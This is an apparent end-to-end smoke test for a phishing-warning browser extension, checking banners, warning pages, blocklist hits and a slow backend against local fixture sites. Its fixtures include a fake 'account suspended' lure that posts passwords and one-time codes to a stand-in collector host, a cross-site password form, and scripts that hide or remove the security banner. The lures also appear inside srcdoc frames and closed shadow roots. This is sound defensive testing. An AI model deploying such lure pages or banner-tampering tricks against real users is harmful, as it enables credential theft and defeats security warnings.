// Browser smoke test (not part of CI): loads extension/dist in Chromium, with a stub backend on
// 127.0.0.1:8000 and a local page server; every host name resolves to the local page server.
// With REAL_BACKEND=1 the stub is not started: run `uvicorn backend.app:create_app --factory` on
// 127.0.0.1:8000 first, with lists built from a feed that lists quietgarden-recipes.com (see docs/BACKEND.md).
// Needs Playwright (global or local) and a Chromium. Run: node build.mjs && node e2e/smoke.mjs
//
// Pages (verdicts from the shipped models):
//   http://www.wikipedia.org:8123/wiki/Phishing  safe
//   http://evil-blocked.com:8123/a               suspicious -> banner
//   http://evil-blocked.com:8123/login           suspicious + password form to another site -> dangerous
//                                                (page too short for the page model: form rule)
//   http://evil-blocked.com:8123/signin          suspicious address, lure page -> page model: dangerous
//   http://secure-paypal-login.xyz:8123/verify-account  dangerous address, login form -> warning page,
//                                                "proceed anyway"
// 2026-10-20 (address model alone):
//   http://acme-tools.in:8123/api/verify         dangerous address, page asks for nothing -> banner only
//   http://acme-tools.in:8123/api/turnstile/verify  dangerous address that redirects (form post) to a
//                                                safe page -> no warning
//   http://quietgarden-recipes.com:8123/soup     safe by the model, on the stub blocklist -> warning page
// 2026-10-15 fixes:
//   http://bakery-hours.org:8123/frame-host      safe page framing a login form from a dangerous address -> warning
//   http://evil-blocked.com:8123/hide            suspicious; the page hides and keeps removing the banner -> warning
//   http://evil-blocked.com:8123/spa             safe; pushState to /x (suspicious) -> banner
//   http://bakery-hours.org:8123/blob            safe page that opens a page built in memory (blob:) -> stays safe
//   http://evil-blocked2.com:8123/a              suspicious; the backend answers "high" after 2 s -> banner first,
//                                                warning page after the answer
//   "Take me back to safety" returns to the last safe page, and "trust this site" never overrides
//   a blocklist hit.

import assert from "node:assert/strict";
import { createServer } from "node:http";
import { createRequire } from "node:module";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

import { readFileSync } from "node:fs";

import { hashPrefix } from "../dist/keys.js";
import { sha256Hex } from "../dist/listsync.js";

const require = createRequire(import.meta.url);
const { chromium } = require(process.env.PLAYWRIGHT_MODULE ?? "playwright");
const dist = join(dirname(fileURLToPath(import.meta.url)), "..", "dist");

const listen = (server, port) => new Promise((resolve) => server.listen(port, "127.0.0.1", resolve));
const BYTES = 6;
const feedback = [];
const scoreCalls = [];
let slowAnsweredAt = null;

let stubCache;
async function stubLists() {
  if (stubCache) return stubCache;
  const bundled = JSON.parse(readFileSync(join(dist, "data", "allowlist.json"), "utf8"));
  const blocklist = JSON.stringify({ version: "stub1", prefix_bytes: BYTES, domains: [await hashPrefix("quietgarden-recipes.com", BYTES)], urls: [] });
  // the real builder never allowlists a blocklisted domain
  const blocked = await hashPrefix("quietgarden-recipes.com", bundled.prefix_bytes);
  const allowlist = JSON.stringify({ ...bundled, version: "stub1", domains: bundled.domains.filter((d) => d !== blocked) });
  const manifest = { version: "stub1", sha256: { blocklist: await sha256Hex(blocklist), allowlist: await sha256Hex(allowlist) } };
  stubCache = { manifest, blocklist, allowlist };
  return stubCache;
}

const backend = createServer(async (req, res) => {
  let body = "";
  for await (const chunk of req) body += chunk;
  const json = (obj) => {
    res.setHeader("Content-Type", "application/json");
    res.end(JSON.stringify(obj));
  };
  // Lists as the real backend serves them: the manifest carries each file's sha256 (unsigned here,
  // since the build ships no public key unless one was made), and the allowlist is a full one.
  const lists = await stubLists();
  if (req.url === "/lists/manifest") return json(lists.manifest);
  if (req.url === "/lists/blocklist.json") return res.end(lists.blocklist);
  if (req.url === "/lists/allowlist.json") return res.end(lists.allowlist);
  if (req.url === "/score") {
    const { domain } = JSON.parse(body);
    scoreCalls.push(JSON.parse(body));
    if (domain === "evil-blocked2.com") {
      await new Promise((r) => setTimeout(r, 2000)); // under the 2.5 s timeout; the verdict must not wait for it
      slowAnsweredAt = Date.now();
      const signals = [{ severity: "high", text: "This domain was registered 2 days ago." }];
      return json({ domain, risk: "high", signals, tier_c_model: false, cached: false, error: null });
    }
    return json({ domain, risk: "low", signals: [], tier_c_model: false, cached: false, error: null });
  }
  if (req.url === "/feedback") {
    feedback.push(JSON.parse(body));
    return json({ ok: true });
  }
  res.statusCode = 404;
  res.end();
});

// A page with enough text for the page model: account-suspended lure, password and OTP fields.
const SIGNIN_PAGE = `<!DOCTYPE html><html><head><title>Sign in to your account</title></head><body>
<h1>Your account has been suspended</h1><p>We noticed unusual activity. Verify your identity within 24
hours or your account will be closed. Enter your password and the one-time code we sent you to confirm
your account and restore access immediately.</p>
<form action="https://collector-api.example.net/submit" method="post"><input name="email" placeholder="Email">
<input type="password" name="password"><input name="otp" placeholder="OTP code"><button type="submit">Verify</button></form>
<script>var x=atob("aGVsbG8=");eval(x);</script></body></html>`;

const LOGIN_FORM = '<form action="/p" method="post"><input name="u"><input type="password" name="p"><button>Sign in</button></form>';
const EXTRA = {
  "/frame-host": `<html><body><h1 id="ok">Bakery</h1><iframe src="http://secure-paypal-login.xyz:8123/frame-login"></iframe></body></html>`,
  "/frame-login": `<html><body>${LOGIN_FORM}</body></html>`,
  "/verify-account": `<html><body><h1 id="ok">Verify</h1>${LOGIN_FORM}</body></html>`,
  "/hide": `<html><head><style>phishdrift-banner, body > *:last-child { display: none !important; }</style></head>
    <body><h1 id="ok">hide</h1><script>setInterval(() => document.querySelectorAll("phishdrift-banner").forEach((e) => e.remove()), 50);</script></body></html>`,
  "/spa": `<html><body><h1 id="ok">spa</h1><script>setTimeout(() => history.pushState({}, "", "/x"), 1500);</script></body></html>`,
  "/blob": `<html><body><h1 id="ok">blob</h1><script>
    const b = new Blob(["<html><body><h1>Receipt</h1><p>Thanks for your order.</p></body></html>"], { type: "text/html" });
    setTimeout(() => { location.href = URL.createObjectURL(b); }, 500);</script></body></html>`,
};

const signinBody = SIGNIN_PAGE.match(/<body>([\s\S]*)<\/body>/)[1].replace(/<script>[\s\S]*?<\/script>/, "");
EXTRA["/srcdoc-host"] = `<html><body><h1 id="ok">Bakery</h1><iframe width="600" height="400" srcdoc="${SIGNIN_PAGE.replace(/&/g, "&amp;").replace(/"/g, "&quot;")}"></iframe></body></html>`;
EXTRA["/shadow"] = `<html><body><h1 id="ok">News</h1><div id="sh"></div><script>
  document.getElementById("sh").attachShadow({ mode: "closed" }).innerHTML = ${JSON.stringify(signinBody)};</script></body></html>`;

const pages = createServer((req, res) => {
  res.setHeader("Content-Type", "text/html");
  const path = req.url.split("?")[0];
  if (path === "/api/turnstile/verify") {
    // a form post's verify-and-redirect hop; the server first checks the token with Cloudflare
    setTimeout(() => res.writeHead(303, { Location: "/branch/second/subjects/CSE" }).end(), 800);
  } else if (EXTRA[path]) {
    res.end(EXTRA[path]);
  } else if (req.url === "/signin") {
    res.end(SIGNIN_PAGE);
  } else if (req.url === "/login") {
    res.end('<form action="http://collector.test:8123/p" method="post"><input type="password" name="p"></form>');
  } else {
    res.end(`<html><body><h1 id="ok">page ${req.url}</h1></body></html>`);
  }
});

const real = process.env.REAL_BACKEND === "1";
if (!real) await listen(backend, 8000);
await listen(pages, 8123);

const context = await chromium.launchPersistentContext("", {
  channel: "chromium",
  headless: true,
  args: [`--disable-extensions-except=${dist}`, `--load-extension=${dist}`, "--host-resolver-rules=MAP * 127.0.0.1,EXCLUDE localhost"],
});
let failed = false;
try {
  let [worker] = context.serviceWorkers();
  worker ??= await context.waitForEvent("serviceworker");
  const extId = new URL(worker.url()).host;
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
  const tabState = (tabId) => worker.evaluate(async (k) => (await chrome.storage.session.get(k))[k], `tab:${tabId}`);
  const tabIdOf = (page) => worker.evaluate(async (url) => (await chrome.tabs.query({})).find((t) => t.url === url || t.pendingUrl === url)?.id, page.url());
  const settle = async (page, pred, what) => {
    for (let i = 0; i < 60; i++) {
      if (await pred().catch(() => false)) return;
      await sleep(250);
    }
    throw new Error(`timed out: ${what} (now at ${page.url()})`);
  };
  // the stored verdict of the tab showing `url` (no tabs permission: found by address)
  const stateOf = (url) =>
    worker.evaluate(async (u) => {
      const all = await chrome.storage.session.get(null);
      return Object.entries(all).find(([k, v]) => k.startsWith("tab:") && v?.url === u)?.[1] ?? null;
    }, url);
  const open = async (url) => {
    const page = await context.newPage();
    await page.goto(url).catch(() => {}); // a redirect to the warning page aborts the navigation
    return page;
  };

  // The list sync runs at install; wait for it.
  await settle(worker, async () => Boolean(await worker.evaluate(async () => (await chrome.storage.local.get("lists")).lists?.version)), "list sync");

  // 1. safe page: no banner, no warning, no backend call
  let page = await open("http://www.wikipedia.org:8123/wiki/Phishing");
  await sleep(1500);
  assert.match(page.url(), /wikipedia/);
  assert.equal(await page.locator("phishdrift-banner").count(), 0);
  if (!real) assert.equal(scoreCalls.length, 0, "no domain is sent for an address the model passes");
  console.log("ok  safe page untouched, nothing sent to the backend");

  // 2. suspicious: banner, and only the domain went to the backend
  page = await open("http://evil-blocked.com:8123/a");
  await settle(page, async () => (await page.locator("phishdrift-banner").count()) === 1, "banner");
  if (!real) assert.deepEqual(scoreCalls.at(-1), { domain: "evil-blocked.com", local_verdict: 1 });
  console.log("ok  suspicious page shows the banner", real ? "(real backend)" : `; backend got ${JSON.stringify(scoreCalls.at(-1))}`);

  // the warning page asks the service worker for its reasons after it opens: wait for them
  const reasonsOf = async (page) => {
    await page.waitForSelector("#reasons li", { timeout: 10000 });
    return page.locator("#reasons").innerText();
  };

  // 3. page check: password form to another site escalates to the warning page
  page = await open("http://evil-blocked.com:8123/login");
  await settle(page, async () => page.url().startsWith(`chrome-extension://${extId}/warning.html`), "warning page");
  assert.match(await reasonsOf(page), /different website/);
  console.log("ok  cross-site password form escalates to the warning page");

  // 3b. page model: a lure page on a suspicious address is read on the device and raised to dangerous
  page = await open("http://evil-blocked.com:8123/signin");
  await settle(page, async () => page.url().startsWith(`chrome-extension://${extId}/warning.html`), "page-model warning");
  assert.ok((await reasonsOf(page)).length > 0);
  console.log("ok  page model reads the page and raises it to the warning page");

  // 4. dangerous by the model: warning page, report, proceed anyway
  page = await open("http://secure-paypal-login.xyz:8123/verify-account");
  await settle(page, async () => page.url().startsWith(`chrome-extension://${extId}/warning.html`), "warning page");
  assert.ok((await reasonsOf(page)).length > 0);
  await page.click("#report");
  await page.waitForFunction(() => true);
  if (!real) {
    await settle(page, async () => feedback.length === 1, "feedback");
    assert.deepEqual(Object.keys(feedback[0]).sort(), ["domain", "kind", "verdict"]);
    assert.equal(feedback[0].domain, "secure-paypal-login.xyz");
  } else {
    await sleep(1000);
  }
  await page.click("#proceed");
  await settle(page, async () => page.url().startsWith("http://secure-paypal-login.xyz:8123/"), "proceed anyway");
  await page.waitForSelector("#ok");
  console.log("ok  dangerous page: reasons shown, false-positive report sends domain only, proceed anyway works");

  // 4b. dangerous by the address model alone, on a page that asks for nothing: banner, never blocked
  page = await open("http://acme-tools.in:8123/api/verify");
  await page.waitForSelector("#ok");
  await settle(page, async () => (await page.locator("phishdrift-banner").count()) === 1, "address-only banner");
  await sleep(6000); // past the hold for the page check
  assert.ok(page.url().startsWith("http://acme-tools.in:8123/api/verify"), `blocked: ${page.url()}`);
  const held = await stateOf(page.url());
  assert.equal(held?.verdict, 1, JSON.stringify(held));
  assert.match(held.notes.join(" "), /not blocked/);
  console.log("ok  address model alone on a page without credential fields: banner, not the warning page");

  // 4c. a dangerous-looking hop that redirects to an ordinary page (form post to a verify endpoint)
  page = await open("http://acme-tools.in:8123/api/turnstile/verify");
  await page.waitForSelector("#ok");
  await sleep(1500);
  assert.equal(page.url(), "http://acme-tools.in:8123/branch/second/subjects/CSE");
  assert.equal((await stateOf(page.url()))?.verdict, 0);
  console.log("ok  redirect hop with a dangerous-looking address is not blocked; the page it lands on is judged");

  // 5. blocklist hit on an address the model passes
  page = await open("http://quietgarden-recipes.com:8123/soup");
  await settle(page, async () => page.url().startsWith(`chrome-extension://${extId}/warning.html`), "blocklist warning");
  assert.match(await reasonsOf(page), /list of known phishing/);
  console.log("ok  blocklist hit blocks an address the model passes");

  const isWarning = (page) => page.url().startsWith(`chrome-extension://${extId}/warning.html`);

  // 7. a login form in a frame from a dangerous address raises the safe page that frames it
  page = await open("http://bakery-hours.org:8123/frame-host");
  await settle(page, async () => isWarning(page), "frame warning");
  assert.match(await reasonsOf(page), /login form from another website/);
  console.log("ok  login form in a cross-site frame is checked and raises the page to the warning page");

  // 8. a page that hides the banner with CSS and keeps removing it gets the full warning page
  page = await open("http://evil-blocked.com:8123/hide");
  await settle(page, async () => isWarning(page), "tamper warning");
  assert.match(await reasonsOf(page), /tried to hide/);
  console.log("ok  hiding / removing the banner turns a suspicious page into the warning page");

  // 9. single-page app: an in-page address change to a suspicious address shows the banner
  page = await open("http://evil-blocked.com:8123/spa");
  await sleep(800);
  assert.equal(await page.locator("phishdrift-banner").count(), 0);
  await settle(page, async () => (await page.locator("phishdrift-banner").count()) === 1, "SPA banner");
  assert.ok(await page.evaluate(() => getComputedStyle(document.querySelector("phishdrift-banner")).display === "block"));
  console.log("ok  in-page route change is rechecked (banner shown, page CSS cannot hide it)");

  // 10. a page built in memory (blob:) is judged by the site that built it, not scored as 0.99
  page = await open("http://bakery-hours.org:8123/blob");
  await settle(page, async () => page.url().startsWith("blob:"), "blob page");
  await sleep(1500);
  assert.ok(!isWarning(page));
  // tabs have no readable URL without the "tabs" permission: find the tab's verdict by its address
  const blobState = await worker.evaluate(async (url) => {
    const all = await chrome.storage.session.get(null);
    return Object.entries(all).find(([k, v]) => k.startsWith("tab:") && v?.url === url)?.[1] ?? null;
  }, page.url());
  assert.equal(blobState?.verdict, 0, JSON.stringify(blobState));
  console.log("ok  blob: page stays safe (it was dangerous before: every blob address scored 0.99)");

  // 11. "Take me back to safety" goes to the last safe page, never history.back()
  page = await open("http://bakery-hours.org:8123/back");
  await page.waitForSelector("#ok");
  await sleep(1000);
  await page.goto("http://secure-paypal-login.xyz:8123/verify-account").catch(() => {});
  await settle(page, async () => isWarning(page), "warning page before back");
  await page.click("#back");
  await settle(page, async () => page.url() === "http://bakery-hours.org:8123/back", "back to the safe page");
  console.log("ok  'Take me back to safety' returns to the last safe page");

  // 12. trust never overrides a blocklist hit, and trust entries carry a time (expiry)
  await worker.evaluate(async () => chrome.storage.local.set({ trusted: [{ key: "quietgarden-recipes.com", at: Date.now() }] }));
  page = await open("http://quietgarden-recipes.com:8123/soup?again=1");
  await settle(page, async () => isWarning(page), "blocklist warning despite trust");
  await worker.evaluate(async () => chrome.storage.local.set({ trusted: [] }));
  console.log("ok  'trust this site' does not override the blocklist");

  // 13. slow backend: the banner does not wait for it; its later "high" answer raises the page
  if (!real) {
    const t0 = Date.now();
    page = await open("http://evil-blocked2.com:8123/a");
    await settle(page, async () => (await page.locator("phishdrift-banner").count()) === 1 || isWarning(page), "banner before backend");
    const shownAt = Date.now();
    const shownAfter = shownAt - t0;
    assert.ok(!isWarning(page), "the banner came first");
    assert.ok(slowAnsweredAt === null || shownAt <= slowAnsweredAt + 100, "banner shown before the backend answered");
    await settle(page, async () => isWarning(page), "late backend answer raises to the warning page");
    assert.match(await reasonsOf(page), /registered 2 days ago/);
    console.log(`ok  slow backend: banner after ${shownAfter} ms without waiting; late "high" answer raises to the warning page`);
  }

  // 14. a login form in a srcdoc frame on a safe page is judged on the frame's page score alone
  page = await open("http://bakery-hours.org:8123/srcdoc-host");
  await settle(page, async () => isWarning(page) || (await page.locator("phishdrift-banner").count()) === 1, "srcdoc frame warning");
  console.log(`ok  login form in a srcdoc frame on a safe page is flagged (${isWarning(page) ? "warning page" : "banner"})`);

  // 15. a lure form inside a closed shadow root is read (it no longer looks credential-free)
  page = await open("http://evil-blocked.com:8123/shadow");
  await settle(page, async () => isWarning(page), "closed-shadow lure warning");
  console.log("ok  lure form inside a closed shadow root is read by the page check");

  // 6. fail open: backend gone, a flagged page still opens and gets its banner
  if (!real) {
    await new Promise((r) => backend.close(r));
    backend.closeAllConnections?.();
  } else {
    console.log("skip backend-down step with the real backend");
  }
  page = await open("http://evil-blocked.com:8123/a?x=1");
  await settle(page, async () => (await page.locator("phishdrift-banner").count()) === 1, "banner without backend");
  console.log(real ? "ok  flagged page still gets its banner" : "ok  backend down: page still loads and is checked with the address model only");
} catch (err) {
  failed = true;
  console.error("FAIL", err);
} finally {
  await context.close();
  pages.close();
  backend.close();
}
process.exit(failed ? 1 : 0);
